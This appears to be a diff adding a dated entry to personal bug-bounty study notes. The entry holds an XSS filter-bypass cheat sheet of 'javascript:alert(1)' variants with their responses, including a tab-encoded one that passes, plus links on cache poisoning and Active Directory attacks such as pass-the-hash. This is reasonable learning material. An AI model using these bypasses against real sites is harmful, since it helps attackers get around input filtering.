@@ -342,3 +342,29 @@ Weblogic Remote Code Execution involving HTTP protocol and JNDI injection gadget
 ***References***
 - https://nvd.nist.gov/vuln/detail/CVE-2021-2109
 - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-2109
+
+# 📅 22-Jan-2021
+
+## Learn365 Notes from [Harsh Bothra](https://twitter.com/harshbothra_) Day - 11
+- [Cache Poisoned](https://twitter.com/harshbothra_/status/1348674891390742528?s=20)
+
+## XSS -> Breaking JavaScript
+```js
+xjavascript:alert(1)  // 400 Bad Request
+javaScriptx:alert(1)  // 400 Bad Request
+xjavascriptx:alert(1) // 400 Bad Request
+javaxscript:alert(1)  // 200 OK (Breaking javascript)
+```
+also URL encode
+```js
+javas%09script:alert(1) // 200 OK
+```
+
+**Source: https://levelup.gitconnected.com/stealing-user-information-via-xss-via-parameter-pollution-7d99b3379e7d**
+
+## AD Attacks
+- https://stealthbits.com/blog/performing-domain-reconnaissance-using-powershell/
+- https://stealthbits.com/blog/local-admin-mapping-bloodhound/
+- https://stealthbits.com/blog/extracting-password-hashes-from-the-ntds-dit-file/
+- https://stealthbits.com/blog/passing-the-hash-with-mimikatz/
+
